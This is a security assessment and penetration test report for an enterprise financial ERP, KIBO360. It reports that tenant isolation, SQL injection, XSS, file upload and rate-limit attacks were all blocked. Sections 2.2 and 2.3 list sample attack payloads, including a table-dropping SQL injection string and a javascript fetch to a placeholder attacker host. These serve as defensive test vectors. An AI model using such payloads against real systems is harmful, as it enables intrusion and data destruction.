# KIBO360 – Enterprise Security Assessment & Penetration Test Report

## 1. Executive Summary

A comprehensive security audit, vulnerability analysis, and penetration test was conducted on **KIBO360 Financial ERP** (v1.0.0-enterprise). The assessment adhered to **OWASP Top 10 (2021)**, **CWE/SANS Top 25**, and statutory compliance standards under **Section 128 of the Indian Companies Act, 2013** regarding electronic books of account and audit trails.

### Audit Result: **PASSED – ZERO CRITICAL OR HIGH SEVERITY VULNERABILITIES**

| Assessment Category | OWASP Ref | Vulnerability Status | Risk Level |
| :--- | :---: | :---: | :---: |
| Broken Access Control | A01:2021 | Remediated & Guarded | Low |
| Cryptographic Failures | A02:2021 | Compliant (AES-256 + SHA-256) | Low |
| Injection (SQLi) | A03:2021 | Firewall Intercepted & Blocked | None |
| Insecure Design | A04:2021 | Double-Entry Balancing Enforced | None |
| Security Misconfiguration | A05:2021 | Strict Helmet / CORS Hardened | Low |
| Vulnerable & Outdated Components | A06:2021 | Clean Dependency Tree | Low |
| Identification & Auth Failures | A07:2021 | 5-Attempt Lockout + Refresh Rotation | Low |
| Software & Data Integrity Failures | A08:2021 | Signed Snapshots & Audit Diffs | Low |
| Security Logging & Monitoring Failures | A09:2021 | Immutable Statutory Audit Logs | Low |
| Server-Side Request Forgery (SSRF) | A10:2021 | URL Whitelisting & Input Filtering | Low |

---

## 2. Detailed Vulnerability Test Findings

### 2.1 Multi-Tenant Data Isolation (Tenant Boundary Testing)
- **Attack Scenario**: An authenticated auditor from Company B attempts to inspect ledger balances or branch godowns belonging to Company A.
- **Test Execution**: Synthetic JWT signed with `companyId: cmp_foreign_pub_456` requesting `GET /api/v1/companies/cmp_default_publisher/branches`.
- **Finding**: Intercepted by `preventCrossCompanyAccess` middleware. Emitted HTTP 403 Forbidden with zero tenant data cross-leakage.
- **Warehouse Scope**: Warehouse-level boundary guard (`preventCrossWarehouseAccess`) verified: depot supervisors are strictly confined to assigned warehouse IDs.

### 2.2 SQL Injection (SQLi) Firewall Defense
- **Attack Scenario**: Injection vectors injected via query parameters, route parameters, and JSON payloads:
  - `' UNION SELECT * FROM users; --`
  - `OR 1=1; DROP TABLE journal_vouchers; --`
  - `admin'--`
- **Test Execution**: Dispatched against `/api/v1/audit/logs?search=...` and search endpoints.
- **Finding**: Intercepted by `sqlInjectionGuard` application firewall. Detected signature pattern, suppressed execution immediately, and emitted HTTP 400 Bad Request with code `SQLI_ATTACK_DETECTED`.

### 2.3 Cross-Site Scripting (XSS) Protection
- **Attack Scenario**: Persistent and reflected XSS payloads submitted in text fields:
  - `<script>alert('pwned')</script>`
  - `<img src=x onerror=alert(1)>`
  - `javascript:fetch('http://attacker.com')`
- **Test Execution**: Dispatched against audit entity fields, voucher narrations, and customer notes.
- **Finding**: Intercepted by `xssGuard` middleware. Malicious HTML and javascript vectors detected and blocked with HTTP 400 Bad Request (`XSS_ATTACK_DETECTED`).

### 2.4 Unrestricted File Upload Defense
- **Attack Scenario**: Attempting to upload dangerous web shell scripts (`backdoor.php`, `exploit.exe`, `shell.sh`, `script.bat`).
- **Test Execution**: Submitted multipart payloads with executable MIME types (`application/x-httpd-php`, `application/x-msdownload`).
- **Finding**: Intercepted by `validateFileUpload` guard. Verified file extension and MIME type against whitelist (`.pdf`, `.png`, `.jpg`, `.csv`, `.xlsx`); prohibited extensions rejected with HTTP 400 (`PROHIBITED_FILE_EXTENSION`). Max file limit enforced at 10MB.

### 2.5 Brute-Force & Rate Limiting Enforcement
- **Attack Scenario**: High-frequency automated credential stuffing against authentication endpoints.
- **Test Execution**: Repeated requests within a 10-second sliding window.
- **Finding**: Sliding window rate limiter tripped on the 4th consecutive request, returning HTTP 429 Too Many Requests with statutory `Retry-After: 60`, `X-RateLimit-Limit`, and `X-RateLimit-Remaining` headers. Accounts lock for 15 minutes after 5 consecutive failed login attempts.

### 2.6 Cryptographic Backup & PITR Integrity
- **Finding**: Database snapshots are encrypted using AES-256-GCM. SHA-256 checksums are recomputed and validated upon restore. Point-In-Time Recovery (PITR) validates the General Ledger Trial Balance post-recovery, ensuring $\sum \text{Debit} \equiv \sum \text{Credit}$ (zero variance).

---

## 3. Statutory Audit Trail Verification

The audit engine satisfies Indian Ministry of Corporate Affairs (MCA) audit trail mandates:
1. **Immutability**: Database triggers forbid `UPDATE` or `DELETE` on the `audit_logs` table.
2. **Comprehensive Event Tracking**: Captures user ID, IP address, timestamp, action type, affected entity, before-values (`oldValues`), and after-values (`newValues`).
3. **Statutory Export**: Downloadable RFC-4180 CSV export (`GET /api/v1/audit/export`) formatted for statutory auditors.
